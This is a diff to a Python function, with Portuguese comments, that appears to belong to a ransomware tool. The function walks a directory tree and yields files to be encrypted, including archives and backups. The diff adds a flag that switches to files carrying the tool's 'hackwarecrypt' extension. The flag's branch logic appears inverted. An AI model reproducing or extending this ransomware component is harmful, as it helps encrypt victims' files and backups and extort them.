@@ -2,15 +2,15 @@
 import os
 
 
-def discover(initial_path):
+def discover(initial_path, encrypted=False):
     '''
     Caminha recursivamente à partir do caminho inicial, especificado pelo
-    :initial_path: é a pasta raíz ou inicial, onde os arquivos deverão 
+    :initial_path: é a pasta raíz ou inicial, onde os arquivos deverão
         ser descobertos e listados para depois serem encryptados.
 
-    Atenção: 
-      - Nenhuma verificação de error é feita neste código 
-        no processo atual é assumido que o usuário atual 
+    Atenção:
+      - Nenhuma verificação de error é feita neste código
+        no processo atual é assumido que o usuário atual
         tem permissão de leitura, execução e escrita.
     '''
 
@@ -38,8 +38,17 @@ def discover(initial_path):
 
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Arquivos compactados e Backups
 
+    ]
+
+    encrypted_extensions = [
         'hackwarecrypt',  # Arquivos criptografados anteriormente
     ]
+
+    # Define as extensões que o arquivo deverá buscar
+    if encrypted:
+        extList = extensions
+    else:
+        extList = encrypted_extensions
 
     # dirpath - caminho atual
     # dirs - pastas no caminho atual
@@ -48,7 +57,7 @@ def discover(initial_path):
         for _file in files:
             absolute_path = os.path.abspath(os.path.join(dirpath, _file))
             ext = absolute_path.split('.')[-1]
-            if ext in extensions:
+            if ext in extList:
                 yield absolute_path
 
 
